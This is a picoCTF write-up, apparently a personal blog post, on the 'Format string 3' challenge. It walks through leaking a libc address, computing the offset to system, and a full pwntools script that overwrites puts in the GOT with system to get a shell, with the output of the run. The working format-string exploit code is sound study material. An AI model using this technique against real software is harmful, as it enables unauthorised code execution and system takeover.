---
title: "Format string 3"
date: "2025-07-20"
tags: ["picoCTF", "format string", "GOT overwrite"]
---

In this challenge I get 4 things:

* Binary
* C source
* Lib-c
* Interpreter

To get everything ready and work with it like any other binary that does not carry its own interpreter or Lib-c, I use the `Pwninit` command. It builds a new binary out of the one in the current directory and links it against everything it needs, so I do not have to worry about that.

```c
./format-string-3_patched
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ffff7e5a3f0
hola
hola
/bin/sh
```

The program leaks an address, echoes my input back and also prints `/bin/sh`.

Let me look at the source of the program:

```c
#include <stdio.h>
#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf); // Dirección Leakeada
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf); // Vulnerabilidad de Format String

	puts(normal_string);  // '/bin/sh'

	return 0;
}
```

Okay, there is a format string vulnerability, because `printf` is never told the format of the variable it has to print. As I can see there is a `puts(/bin/sh)`. That really stands out. If I manage to turn that `puts` into a `system` I get a shell. Since I have a format string vulnerability, I am going to overwrite the got and make that swap.

For that I can use the `mtstr_payload` function from pwntools. To make it work I need 2 things:

* The position on the Stack of a parameter I control.
* A dictionary with the memory address to overwrite (here the address of puts in the got) and the new value I want to write (here the address of system)

Let me fuzz the stack to pull out the values that matter:

```c
python fuzz.py

38: [b'ABCDEF0x3325464544434241'] // Nuestro input (ABCDEF)
```

I found the position on the Stack where my controlled parameter sits! Now I only need the address of `puts` and the address of `system` for the dictionary that goes as an argument to `mtstr_payload`.

I can get the address of puts like this:

```c
pwndbg> disas main
Dump of assembler code for function main:
   . . .
   0x00000000004012ef <+172>:	mov    rdi,rax
   0x00000000004012f2 <+175>:	call   0x401080 <puts@plt> // Dirección de PUTS en la PLT, esta no nos vale 
   0x00000000004012f7 <+180>:	mov    eax,0x0
   . . .
```

```c
pwndbg> disas 0x401080
Dump of assembler code for function puts@plt:
   0x0000000000401080 <+0>:	endbr64
   0x0000000000401084 <+4>:	bnd jmp QWORD PTR [rip+0x2f8d]        # 0x404018 <puts@got.plt>
   0x000000000040108b <+11>:	nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
```

That one does work! The address of puts is `0x404018`. Only the address of System is left. This part is a bit trickier, because `system` is not used in the program, so I cannot just run a `disas`.

So how do I get it? I have to get it out of the Lib-c. There is a catch here. I cannot simply look up the address in the libc they give me, because that libc has PIE enabled.

It looks like getting the address is impossible, but there is something to remember. The program hands me an address inside libc. If I work out the distance from the leaked address to `system`, I can know where `system` lives on the remote machine.

Let me work out the offset:

```python
pwndbg> x/gx system
0x7ffff7e2f760 <system>:	0x74ff8548fa1e0ff3
pwndbg> x/gx setvbuf
0x7ffff7e5a3f0 <setvbuf>:	0x55415641fa1e0ff3

offset = 0x7ffff7e5a3f0 - 0x7ffff7e2f760 = 0x2ac90 # Lo tenemos!
```

Now that I have everything I need I can write the script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 60672)

    return r


def main():
    r = conn()
    controlable = 38
    
    r.recvlines(1)
    leaked = r.recvline().decode().strip() 
    info(f'Leaked: {leaked}')
    
    leaked_vbuf = int(leaked.split()[-1], 16) # Guardamos la dirección que leakea el programa
    info(f'Leaked VBUF: {hex(leaked_vbuf)}')
    
    puts_address = 0x404018 # Dirección de Puts
    
    vbuf_to_sustem_offset = 0x7ffff7e5a3f0 - 0x7ffff7e2f760 # Calculo del offset
    info(f'vbuf_to_sustem_offset: {hex(vbuf_to_sustem_offset)}')
    system_address= leaked_vbuf - vbuf_to_sustem_offset # Calculo de la dirección system
    info(f'System Address: {hex(system_address)}')
    valor = {puts_address: system_address} # Diccionario (DIRECCIÓN A SOBRESCRBIR: NUEVO VALOR)
    
    payload = fmtstr_payload(controlable, valor, write_size='byte')
    
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

Let me run it and see if it works:

```c
python solve.py            
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/format-string-3_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fd000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to rhea.picoctf.net on port 51335: Done
[*] Leaked: Okay I'll be nice. Here's the address of setvbuf in libc: 0x716f9495a3f0
[*] Leaked VBUF: 0x716f9495a3f0
[*] vbuf_to_sustem_offset: 0x2ac90
[*] System Address: 0x716f9492f760
[*] Switching to interactive mode
whoami
root
$ ls
Makefile
artifacts.tar.gz
flag.txt // LA FLAG
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$  
```

I am in!
